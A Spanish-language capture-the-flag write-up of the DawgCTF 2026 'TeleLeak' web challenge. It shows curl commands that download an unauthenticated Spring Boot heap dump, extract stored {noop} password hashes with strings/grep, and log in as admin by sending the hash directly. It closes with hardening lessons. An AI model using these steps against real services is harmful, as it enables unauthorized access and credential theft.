# TeleLeak

| Campo       | Valor           |
|-------------|-----------------|
| Plataforma  | DawgCTF 2026    |
| Categoría   | web             |
| Dificultad  | Medium          |
| Solves      | 30              |
| Autor       | That1Cam400     |

## Descripción
> I run a messaging service that is really useful for archiving my encrypted messages, however I seemed to have misplaced my credentials, could you find a way in for me?

## TL;DR
Spring Boot app con `/actuator/heapdump` expuesto. El heap dump contiene las contraseñas almacenadas en la base de datos H2 en memoria, prefijadas con `{noop}` (sin cifrado). Login como `admin` con la hash extraída da el flag.

## Análisis inicial

```bash
curl -s https://teleleak.umbccd.net/
# → Spring Boot app con login/register
# Headers: JSESSIONID → Spring Boot

curl -s https://teleleak.umbccd.net/robots.txt
# → Disallow: /

curl -s https://teleleak.umbccd.net/actuator
# → {"_links":{"self":...,"heapdump":{"href":"http://teleleak.umbccd.net/actuator/heapdump",...}}}
```

**Spring Boot Actuator expuesto**, con endpoint `/actuator/heapdump` accesible sin autenticación.

## Vulnerabilidad identificada

1. `/actuator/heapdump` accesible sin auth → descarga Java HPROF dump (288 MB)
2. H2 base de datos en memoria → credenciales de usuarios en el heap
3. Passwords almacenadas con encoder `{noop}` → texto plano (solo hash SHA-256 del cliente)
4. El cliente hace SHA-256 de la contraseña antes de enviarla

### Tipo de vulnerabilidad
- Spring Boot Actuator misconfiguration (CWE-200)
- Insecure password storage (CWE-522)

## Proceso de resolución

### Paso 1: Descubrir actuator
```bash
curl -s https://teleleak.umbccd.net/actuator
# Responde con JSON con "heapdump" link
```

### Paso 2: Descargar heap dump
```bash
curl -s -o heapdump https://teleleak.umbccd.net/actuator/heapdump
# 288 MB, Java HPROF dump
```

### Paso 3: Extraer credenciales del heap
```bash
strings heapdump | grep '{noop}'
# → {noop}f374e70b2d71eb7188c0eda0b6a13d47ca5abd681118de48354f003d8af534f5
# → {noop}a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea
```

Spring Security usa prefijo `{noop}` para indicar "sin codificación". El valor es SHA-256(contraseña_usuario) enviado por el cliente.

### Paso 4: Identificar username
El heap también contiene request bodies de intentos de login previos (otros jugadores). Buscando contexto alrededor de las hashes `{noop}`, se identifica que `f374e70b...` aparece en intentos de login como `admin`.

Verificado con brute-force de usernames conocidos contra las 2 hashes `{noop}`.

### Paso 5: Login y flag
```bash
# El login form hashea SHA-256(password) client-side
# El servidor recibe y compara con {noop}<hash>
# Enviamos la hash directamente (bypass client-side JS)

curl -s -b cookies.txt -c cookies.txt \
  -X POST https://teleleak3.umbccd.net/login \
  -d "username=admin&password=f374e70b2d71eb7188c0eda0b6a13d47ca5abd681118de48354f003d8af534f5&_csrf=..." \
  -L
# → Welcome Admin! Dawgctf{w3b_m3m_Dumpz!}
```

## Approaches descartados
- **SQL injection** en username/password → login usa query parametrizada
- **Replay de login attempts** del heap → los hashes que otros jugadores enviaron no coincidían con el stored hash del admin
- **Búsqueda por JSON** (`"username": "admin"`) → encontrado pero sin campo password visible

## Exploit final
Ver `solve.py`

## Flag
```
Dawgctf{w3b_m3m_Dumpz!}
```

## Key Lessons
- Spring Boot Actuator **nunca debe exponerse en producción** sin autenticación
- `{noop}` prefix en Spring Security = no hay hash de la contraseña almacenada
- Los heap dumps contienen toda la memoria JVM: DB rows, request params, session data
- El cliente puede bypasear el hashing JS enviando curl directamente con el SHA-256 hash

## Referencias
- [Spring Boot Actuator security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [CVE-2019-5052 - Actuator heapdump exposure](https://tanzu.vmware.com/security/cve-2019-5052)
